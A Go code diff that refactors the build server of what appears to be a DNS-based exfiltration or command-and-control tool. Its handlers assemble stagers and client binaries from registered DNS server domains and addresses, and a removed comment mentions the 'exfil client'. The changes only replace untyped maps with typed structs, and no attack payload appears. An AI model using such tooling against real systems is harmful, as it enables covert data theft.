@@ -614,7 +614,7 @@ func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) 
 			api.sendError(w, http.StatusInternalServerError, "failed to generate build ID")
 			return
 		}
-		if existing, _ := api.db.GetBuildConfigByBuildID(candidate); existing == nil {
+		if existing, _ := api.db.GetBuildConfigByBuildID(candidate); existing.BinaryID == "" {
 			buildID = candidate
 			break
 		}
@@ -1055,10 +1055,8 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		// Collect ALL active DNS server domains
 		var activeDomains []string
 		for _, server := range dnsServers {
-			if status, ok := server["status"].(string); ok && status == "active" {
-				if domain, ok := server["domain"].(string); ok {
-					activeDomains = append(activeDomains, domain)
-				}
+			if server.Status == "active" && server.Domain != "" {
+				activeDomains = append(activeDomains, server.Domain)
 			}
 		}
 
@@ -1136,11 +1134,9 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		if err == nil {
 			found := false
 			for _, binary := range clientBinaries {
-				if id, ok := binary["id"].(string); ok && id == clientBinaryID {
+				if binary.ID == clientBinaryID {
 					found = true
-					if filename, ok := binary["filename"].(string); ok {
-						fmt.Printf("[Builder] Found client binary: %s (ID: %s)\n", filename, id)
-					}
+					fmt.Printf("[Builder] Found client binary: %s (ID: %s)\n", binary.Filename, binary.ID)
 					break
 				}
 			}
@@ -1156,11 +1152,9 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 		clientBinaries, err := api.db.GetClientBinaries()
 		if err == nil {
 			for _, binary := range clientBinaries {
-				if os, ok := binary["os"].(string); ok && os == req.Platform {
-					if id, ok := binary["id"].(string); ok {
-						clientBinaryID = id
-						break
-					}
+				if binary.OS == req.Platform {
+					clientBinaryID = binary.ID
+					break
 				}
 			}
 		}
@@ -1178,17 +1172,11 @@ func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) 
 
 			var dnsServerIDs []string
 			for _, server := range dnsServers {
-				if status, ok := server["status"].(string); ok && status == "active" {
-					if id, ok := server["id"].(string); ok {
-						dnsServerIDs = append(dnsServerIDs, id)
-						fmt.Printf("[Builder]   - Active DNS server: %s (status: %s)\n", id, status)
-					}
+				if server.Status == "active" {
+					dnsServerIDs = append(dnsServerIDs, server.ID)
+					fmt.Printf("[Builder]   - Active DNS server: %s (status: %s)\n", server.ID, server.Status)
 				} else {
-					if id, ok := server["id"].(string); ok {
-						if status, ok := server["status"].(string); ok {
-							fmt.Printf("[Builder]   - Skipping DNS server: %s (status: %s)\n", id, status)
-						}
-					}
+					fmt.Printf("[Builder]   - Skipping DNS server: %s (status: %s)\n", server.ID, server.Status)
 				}
 			}
 
@@ -1918,46 +1906,39 @@ func filterEmpty(values []string) []string {
 	return filtered
 }
 
-func collectActiveDomains(servers []map[string]interface{}) []string {
+func collectActiveDomains(servers []DNSServer) []string {
 	seen := make(map[string]struct{})
 	var domains []string
 	for _, server := range servers {
-		status, _ := server["status"].(string)
-		if status != "active" {
+		if server.Status != "active" {
 			continue
 		}
-		if domain, ok := server["domain"].(string); ok {
-			domain = strings.TrimSpace(domain)
-			if domain == "" {
-				continue
-			}
-			if _, exists := seen[domain]; exists {
-				continue
-			}
-			seen[domain] = struct{}{}
-			domains = append(domains, domain)
+		domain := strings.TrimSpace(server.Domain)
+		if domain == "" {
+			continue
 		}
+		if _, exists := seen[domain]; exists {
+			continue
+		}
+		seen[domain] = struct{}{}
+		domains = append(domains, domain)
 	}
 	return domains
 }
 
-func collectServerAddresses(servers []map[string]interface{}) []string {
+func collectServerAddresses(servers []DNSServer) []string {
 	seen := make(map[string]struct{})
 	var ips []string
 	for _, server := range servers {
-		// Collect addresses from all servers, not just active ones
-		// This ensures the exfil client can ACK responses from any registered server
-		if addr, ok := server["address"].(string); ok {
-			addr = strings.TrimSpace(addr)
-			if addr == "" {
-				continue
-			}
-			if _, exists := seen[addr]; exists {
-				continue
-			}
-			seen[addr] = struct{}{}
-			ips = append(ips, addr)
+		addr := strings.TrimSpace(server.Address)
+		if addr == "" {
+			continue
 		}
+		if _, exists := seen[addr]; exists {
+			continue
+		}
+		seen[addr] = struct{}{}
+		ips = append(ips, addr)
 	}
 	return ips
 }
@@ -2126,19 +2107,15 @@ func validatePayloadFormat(format string, domains []string) error {
 	return nil
 }
 
-func selectServerAddress(servers []map[string]interface{}) string {
+func selectServerAddress(servers []DNSServer) string {
 	pick := func(activeOnly bool) string {
 		for _, server := range servers {
-			if activeOnly {
-				if status, ok := server["status"].(string); !ok || status != "active" {
-					continue
-				}
+			if activeOnly && server.Status != "active" {
+				continue
 			}
-			if addr, ok := server["address"].(string); ok {
-				addr = strings.TrimSpace(addr)
-				if addr != "" {
-					return addr
-				}
+			addr := strings.TrimSpace(server.Address)
+			if addr != "" {
+				return addr
 			}
 		}
 		return ""
